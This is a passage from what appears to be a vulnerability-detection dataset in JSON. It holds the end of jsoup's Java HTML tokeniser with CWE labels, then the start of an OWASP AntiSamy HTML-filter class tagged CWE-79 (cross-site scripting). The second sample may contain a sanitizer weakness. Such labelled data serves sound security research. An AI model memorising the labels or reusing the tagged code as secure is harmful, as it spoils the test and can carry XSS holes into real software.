t.tagPending.appendAttributeValue(value);\n\n            char c = r.consume();\n            switch (c) {\n                case '\"':\n                    t.transition(AfterAttributeValue_quoted);\n                    break;\n                case '&':\n                    char[] ref = t.consumeCharacterReference('\"', true);\n                    if (ref != null)\n                        t.tagPending.appendAttributeValue(ref);\n                    else\n                        t.tagPending.appendAttributeValue('&');\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                // no default, handled in consume to any above\n            }\n        }\n    },\n    AttributeValue_singleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            String value = r.consumeToAnySorted(attributeSingleValueCharsSorted);\n            if (value.length() > 0)\n                t.tagPending.appendAttributeValue(value);\n\n            char c = r.consume();\n            switch (c) {\n                case '\\'':\n                    t.transition(AfterAttributeValue_quoted);\n                    break;\n                case '&':\n                    char[] ref = t.consumeCharacterReference('\\'', true);\n                    if (ref != null)\n                        t.tagPending.appendAttributeValue(ref);\n                    else\n                        t.tagPending.appendAttributeValue('&');\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                // no default, handled in consume to any above\n            }\n        }\n    },\n    AttributeValue_unquoted {\n        void read(Tokeniser t, CharacterReader r) {\n            String value = r.consumeToAny('\\t', '\\n', '\\r', '\\f', ' ', '&', '>', nullChar, '\"', '\\'', '<', '=', '`');\n            if (value.length() > 0)\n                t.tagPending.appendAttributeValue(value);\n\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '&':\n                    char[] ref = t.consumeCharacterReference('>', true);\n                    if (ref != null)\n                        t.tagPending.appendAttributeValue(ref);\n                    else\n                        t.tagPending.appendAttributeValue('&');\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                case '\"':\n                case '\\'':\n                case '<':\n                case '=':\n                case '`':\n                    t.error(this);\n                    t.tagPending.appendAttributeValue(c);\n                    break;\n                // no default, handled in consume to any above\n            }\n\n        }\n    },\n    // CharacterReferenceInAttributeValue state handled inline\n    AfterAttributeValue_quoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    r.unconsume();\n                    t.transition(BeforeAttributeName);\n            }\n\n        }\n    },\n    SelfClosingStartTag {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.tagPending.selfClosing = true;\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.transition(BeforeAttributeName);\n            }\n        }\n    },\n    BogusComment {\n        void read(Tokeniser t, CharacterReader r) {\n            // todo: handle bogus comment starting from eof. when does that trigger?\n            // rewind to capture character that lead us here\n            r.unconsume();\n            Token.Comment comment = new Token.Comment();\n            comment.bogus = true;\n            comment.data.append(r.consumeTo('>'));\n            // todo: replace nullChar with replaceChar\n            t.emit(comment);\n            t.advanceTransition(Data);\n        }\n    },\n    MarkupDeclarationOpen {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchConsume(\"--\")) {\n                t.createCommentPending();\n                t.transition(CommentStart);\n            } else if (r.matchConsumeIgnoreCase(\"DOCTYPE\")) {\n                t.transition(Doctype);\n            } else if (r.matchConsume(\"[CDATA[\")) {\n                // todo: should actually check current namepspace, and only non-html allows cdata. until namespace\n                // is implemented properly, keep handling as cdata\n                //} else if (!t.currentNodeInHtmlNS() && r.matchConsume(\"[CDATA[\")) {\n                t.transition(CdataSection);\n            } else {\n                t.error(this);\n                t.advanceTransition(BogusComment); // advance so this character gets in bogus comment data's rewind\n            }\n        }\n    },\n    CommentStart {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.transition(CommentStartDash);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    CommentStartDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.transition(CommentStartDash);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    Comment {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.current();\n            switch (c) {\n                case '-':\n                    t.advanceTransition(CommentEndDash);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    r.advance();\n                    t.commentPending.data.append(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(r.consumeToAny('-', nullChar));\n            }\n        }\n    },\n    CommentEndDash {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.transition(CommentEnd);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append('-').append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append('-').append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    CommentEnd {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(\"--\").append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case '!':\n                    t.error(this);\n                    t.transition(CommentEndBang);\n                    break;\n                case '-':\n                    t.error(this);\n                    t.commentPending.data.append('-');\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.commentPending.data.append(\"--\").append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    CommentEndBang {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '-':\n                    t.commentPending.data.append(\"--!\");\n                    t.transition(CommentEndDash);\n                    break;\n                case '>':\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.commentPending.data.append(\"--!\").append(replacementChar);\n                    t.transition(Comment);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.emitCommentPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.commentPending.data.append(\"--!\").append(c);\n                    t.transition(Comment);\n            }\n        }\n    },\n    Doctype {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeDoctypeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    // note: fall through to > case\n                case '>': // catch invalid <!DOCTYPE>\n                    t.error(this);\n                    t.createDoctypePending();\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.transition(BeforeDoctypeName);\n            }\n        }\n    },\n    BeforeDoctypeName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                t.createDoctypePending();\n                t.transition(DoctypeName);\n                return;\n            }\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break; // ignore whitespace\n                case nullChar:\n                    t.error(this);\n                    t.createDoctypePending();\n                    t.doctypePending.name.append(replacementChar);\n                    t.transition(DoctypeName);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.createDoctypePending();\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.createDoctypePending();\n                    t.doctypePending.name.append(c);\n                    t.transition(DoctypeName);\n            }\n        }\n    },\n    DoctypeName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.matchesLetter()) {\n                String name = r.consumeLetterSequence();\n                t.doctypePending.name.append(name.toLowerCase());\n                return;\n            }\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(AfterDoctypeName);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.name.append(replacementChar);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.name.append(c);\n            }\n        }\n    },\n    AfterDoctypeName {\n        void read(Tokeniser t, CharacterReader r) {\n            if (r.isEmpty()) {\n                t.eofError(this);\n                t.doctypePending.forceQuirks = true;\n                t.emitDoctypePending();\n                t.transition(Data);\n                return;\n            }\n            if (r.matchesAny('\\t', '\\n', '\\r', '\\f', ' '))\n                r.advance(); // ignore whitespace\n            else if (r.matches('>')) {\n                t.emitDoctypePending();\n                t.advanceTransition(Data);\n            } else if (r.matchConsumeIgnoreCase(\"PUBLIC\")) {\n                t.transition(AfterDoctypePublicKeyword);\n            } else if (r.matchConsumeIgnoreCase(\"SYSTEM\")) {\n                t.transition(AfterDoctypeSystemKeyword);\n            } else {\n                t.error(this);\n                t.doctypePending.forceQuirks = true;\n                t.advanceTransition(BogusDoctype);\n            }\n\n        }\n    },\n    AfterDoctypePublicKeyword {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeDoctypePublicIdentifier);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // set public id to empty string\n                    t.transition(DoctypePublicIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // set public id to empty string\n                    t.transition(DoctypePublicIdentifier_singleQuoted);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    BeforeDoctypePublicIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '\"':\n                    // set public id to empty string\n                    t.transition(DoctypePublicIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    // set public id to empty string\n                    t.transition(DoctypePublicIdentifier_singleQuoted);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    DoctypePublicIdentifier_doubleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\"':\n                    t.transition(AfterDoctypePublicIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.publicIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.publicIdentifier.append(c);\n            }\n        }\n    },\n    DoctypePublicIdentifier_singleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\'':\n                    t.transition(AfterDoctypePublicIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.publicIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.publicIdentifier.append(c);\n            }\n        }\n    },\n    AfterDoctypePublicIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BetweenDoctypePublicAndSystemIdentifiers);\n                    break;\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    BetweenDoctypePublicAndSystemIdentifiers {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    AfterDoctypeSystemKeyword {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeDoctypeSystemIdentifier);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case '\"':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    t.error(this);\n                    // system id empty\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n            }\n        }\n    },\n    BeforeDoctypeSystemIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '\"':\n                    // set system id to empty string\n                    t.transition(DoctypeSystemIdentifier_doubleQuoted);\n                    break;\n                case '\\'':\n                    // set public id to empty string\n                    t.transition(DoctypeSystemIdentifier_singleQuoted);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.transition(BogusDoctype);\n            }\n        }\n    },\n    DoctypeSystemIdentifier_doubleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\"':\n                    t.transition(AfterDoctypeSystemIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.systemIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.systemIdentifier.append(c);\n            }\n        }\n    },\n    DoctypeSystemIdentifier_singleQuoted {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\'':\n                    t.transition(AfterDoctypeSystemIdentifier);\n                    break;\n                case nullChar:\n                    t.error(this);\n                    t.doctypePending.systemIdentifier.append(replacementChar);\n                    break;\n                case '>':\n                    t.error(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.doctypePending.systemIdentifier.append(c);\n            }\n        }\n    },\n    AfterDoctypeSystemIdentifier {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    break;\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.eofError(this);\n                    t.doctypePending.forceQuirks = true;\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.error(this);\n                    t.transition(BogusDoctype);\n                    // NOT force quirks\n            }\n        }\n    },\n    BogusDoctype {\n        void read(Tokeniser t, CharacterReader r) {\n            char c = r.consume();\n            switch (c) {\n                case '>':\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                case eof:\n                    t.emitDoctypePending();\n                    t.transition(Data);\n                    break;\n                default:\n                    // ignore char\n                    break;\n            }\n        }\n    },\n    CdataSection {\n        void read(Tokeniser t, CharacterReader r) {\n            String data = r.consumeTo(\"]]>\");\n            t.emit(data);\n            r.matchConsume(\"]]>\");\n            t.transition(Data);\n        }\n    };\n\n\n    abstract void read(Tokeniser t, CharacterReader r);\n\n    static final char nullChar = '\\u0000';\n    private static final char[] attributeSingleValueCharsSorted = new char[]{'\\'', '&', nullChar};\n    private static final char[] attributeDoubleValueCharsSorted = new char[]{'\"', '&', nullChar};\n    private static final char[] attributeNameCharsSorted = new char[]{'\\t', '\\n', '\\r', '\\f', ' ', '/', '=', '>', nullChar, '\"', '\\'', '<'};\n\n    private static final char replacementChar = Tokeniser.replacementChar;\n    private static final String replacementStr = String.valueOf(Tokeniser.replacementChar);\n    private static final char eof = CharacterReader.EOF;\n\n    static {\n        Arrays.sort(attributeSingleValueCharsSorted);\n        Arrays.sort(attributeDoubleValueCharsSorted);\n        Arrays.sort(attributeNameCharsSorted);\n    }\n\n    /**\n     * Handles RawtextEndTagName, ScriptDataEndTagName, and ScriptDataEscapedEndTagName. Same body impl, just\n     * different else exit transitions.\n     */\n    private static void handleDataEndTag(Tokeniser t, CharacterReader r, TokeniserState elseTransition) {\n        if (r.matchesLetter()) {\n            String name = r.consumeLetterSequence();\n            t.tagPending.appendTagName(name.toLowerCase());\n            t.dataBuffer.append(name);\n            return;\n        }\n\n        boolean needsExitTransition = false;\n        if (t.isAppropriateEndTagToken() && !r.isEmpty()) {\n            char c = r.consume();\n            switch (c) {\n                case '\\t':\n                case '\\n':\n                case '\\r':\n                case '\\f':\n                case ' ':\n                    t.transition(BeforeAttributeName);\n                    break;\n                case '/':\n                    t.transition(SelfClosingStartTag);\n                    break;\n                case '>':\n                    t.emitTagPending();\n                    t.transition(Data);\n                    break;\n                default:\n                    t.dataBuffer.append(c);\n                    needsExitTransition = true;\n            }\n        } else {\n            needsExitTransition = true;\n        }\n\n        if (needsExitTransition) {\n            t.emit(\"</\" + t.dataBuffer.toString());\n            t.transition(elseTransition);\n        }\n    }\n\n    private static void handleDataDoubleEscapeTag(Tokeniser t, CharacterReader r, TokeniserState primary, TokeniserState fallback) {\n        if (r.matchesLetter()) {\n            String name = r.consumeLetterSequence();\n            t.dataBuffer.append(name.toLowerCase());\n            t.emit(name);\n            return;\n        }\n\n        char c = r.consume();\n        switch (c) {\n            case '\\t':\n            case '\\n':\n            case '\\r':\n            case '\\f':\n            case ' ':\n            case '/':\n            case '>':\n                if (t.dataBuffer.toString().equals(\"script\"))\n                    t.transition(primary);\n                else\n                    t.transition(fallback);\n                t.emit(c);\n                break;\n            default:\n                r.unconsume();\n                t.transition(fallback);\n        }\n    }\n}\n",
    "target": 0,
    "language": "java",
    "dataset": "vul4j",
    "idx": 200169,
    "RELATED_CWE": [
      "CWE-352",
      "CWE-601",
      "CWE-918"
    ]
  },
  {
    "CWE_ID": [
      "CWE-79"
    ],
    "code": "/*\n * Copyright (c) 2007-2011, Arshan Dabirsiaghi, Jason Li\n * \n * All rights reserved.\n * \n * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:\n * \n * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.\n * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.\n * Neither the name of OWASP nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR\n * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR\n * CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,\n * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\n * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR\n * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF\n * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING\n * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\npackage org.owasp.validator.html.scan;\n\nimport java.util.*;\nimport java.util.regex.Pattern;\n\nimport org.apache.xerces.util.AugmentationsImpl;\nimport org.apache.xerces.util.XMLAttributesImpl;\nimport org.apache.xerces.util.XMLStringBuffer;\nimport org.apache.xerces.xni.Augmentations;\nimport org.apache.xerces.xni.QName;\nimport org.apache.xerces.xni.XMLAttributes;\nimport org.apache.xerces.xni.XMLString;\nimport org.apache.xerces.xni.XNIException;\nimport org.apache.xerces.xni.parser.XMLDocumentFilter;\nimport org.cyberneko.html.filters.DefaultFilter;\nimport org.owasp.validator.css.CssScanner;\nimport org.owasp.validator.css.ExternalCssScanner;\nimport org.owasp.validator.html.CleanResults;\nimport org.owasp.validator.html.InternalPolicy;\nimport org.owasp.validator.html.Policy;\nimport org.owasp.validator.html.ScanException;\nimport org.owasp.validator.html.model.Attribute;\nimport org.owasp.validator.html.model.Tag;\nimport org.owasp.validator.html.util.ErrorMessageUtil;\nimport org.owasp.validator.html.util.HTMLEntityEncoder;\n\n/**\n * Implementation of an HTML-filter that adheres to an AntiSamy policy. This\n * filter is SAX-based which means it is much more memory-efficient and also a\n * bit faster than the DOM-based implementation.\n */\npublic class MagicSAXFilter extends DefaultFilter implements XMLDocumentFilter {\n\n    private static enum Ops {\n        CSS, FILTER, REMOVE, TRUNCATE, KEEP\n    }\n\tprivate final Stack<Ops> operations = new Stack<Ops>();\n\tprivate List<String> errorMessages = new ArrayList<String>();\n\tprivate StringBuffer cssContent = null;\n\tprivate XMLAttributes cssAttributes = null;\n\tprivate CssScanner cssScanner = null;\n\tprivate InternalPolicy policy;\n\tprivate ResourceBundle messages;\n\n\tprivate boolean isNofollowAnchors;\n\tprivate boolean isValidateParamAsEmbed;\n\tprivate boolean inCdata = false;\n    // From policy\n    private boolean preserveComments;\n    private int maxInputSize;\n    private boolean externalCssScanner;\n\n    public MagicSAXFilter(ResourceBundle messages) {\n\t\tthis.messages = messages;\n    }\n\n    public void reset(InternalPolicy instance){\n        this.policy = instance;\n        isNofollowAnchors = policy.isNofollowAnchors();\n        isValidateParamAsEmbed = policy.isValidateParamAsEmbed();\n        preserveComments = policy.isPreserveComments();\n        maxInputSize = policy.getMaxInputSize();\n        externalCssScanner = policy.isEmbedStyleSheets();\n        operations.clear();\n        errorMessages.clear();\n        cssContent = null;\n        cssAttributes = null;\n        cssScanner = null;\n        inCdata = false;\n\n    }\n\n\tpublic void characters(XMLString text, Augmentations augs) throws XNIException {\n        //noinspection StatementWithEmptyBody\n        Ops topOp = peekTop();\n        //noinspection StatementWithEmptyBody\n        if (topOp ==  Ops.REMOVE) {\n\t\t\t// content is removed altogether\n\t\t} else if (topOp == Ops.CSS) {\n\t\t\t// we record the style element's text content\n\t\t\t// to filter it later\n\t\t\tcssContent.append(text.ch, text.offset, text.length);\n\t\t} else {\n\t\t\t// pass through all character content.\n\t\t\tif ( inCdata ) {\n\t\t\t\tString encoded = HTMLEntityEncoder.htmlEntityEncode(text.toString());\n                addError(ErrorMessageUtil.ERROR_CDATA_FOUND, new Object[]{encoded});\n\t\t\t}\n\t\t\tsuper.characters(text, augs);\n\t\t}\n\t}\n\n    private static final Pattern conditionalDirectives =\n            Pattern.compile(\"<?!?\\\\[\\\\s*(?:end)?if[^]]*\\\\]>?\");\n\n    public void comment(XMLString text, Augmentations augs) throws XNIException {\n\n\t\tif (preserveComments) {\n\t\t\tString value = text.toString();\n\t\t\t// Strip conditional directives regardless of the\n\t\t\t// PRESERVE_COMMENTS setting.\n\t\t\tif (value != null) {\n                value = conditionalDirectives.matcher(value).replaceAll(\"\");\n\t\t\t\tsuper.comment(new XMLString(value.toCharArray(), 0, value.length()), augs);\n\t\t\t}\n\t\t}\n\t}\n\n\tpublic void doctypeDecl(String root, String publicId, String systemId, Augmentations augs) throws XNIException {\n\t\t// user supplied doctypes are ignored\n\t}\n\n\tpublic void emptyElement(QName element, XMLAttributes attributes, Augmentations augs) throws XNIException {\n\t\tthis.startElement(element, attributes, augs);\n\t\tthis.endElement(element, augs);\n\t}\n\n    private Ops peekTop(){\n         return operations.empty() ? null : operations.peek();\n    }\n\n\tpublic void endElement(QName element, Augmentations augs) throws XNIException {\n        Ops topOp = peekTop();\n        if (Ops.REMOVE == topOp) {\n\t\t\t// content is removed altogether\n\t\t\toperations.pop();\n\t\t} else if (Ops.FILTER == topOp) {\n\t\t\t// content is removed, but child nodes not\n\t\t\toperations.pop();\n\t\t} else if (Ops.CSS == topOp) {\n\t\t\toperations.pop();\n\t\t\t// now scan the CSS.\n\t\t\tCssScanner cssScanner = makeCssScanner();\n\t\t\ttry {\n\t\t\t\tCleanResults results = cssScanner.scanStyleSheet(cssContent.toString(), maxInputSize);\n\t\t\t\t// report all errors found\n\t\t\t\terrorMessages.addAll(results.getErrorMessages());\n\t\t\t\t/*\n\t\t\t\t * If IE gets an empty style tag, i.e. <style/> it will break\n\t\t\t\t * all CSS on the page. I wish I was kidding. So, if after\n\t\t\t\t * validation no CSS properties are left, we would normally be\n\t\t\t\t * left with an empty style tag and break all CSS. To prevent\n\t\t\t\t * that, we have this check.\n\t\t\t\t */\n                //noinspection StatementWithEmptyBody\n                if (results.getCleanHTML() == null || results.getCleanHTML().equals(\"\")) {\n\t\t\t\t\t// we do not generate empty style elements\n\t\t\t\t} else {\n\t\t\t\t\t// XMLAttributes attributes = new 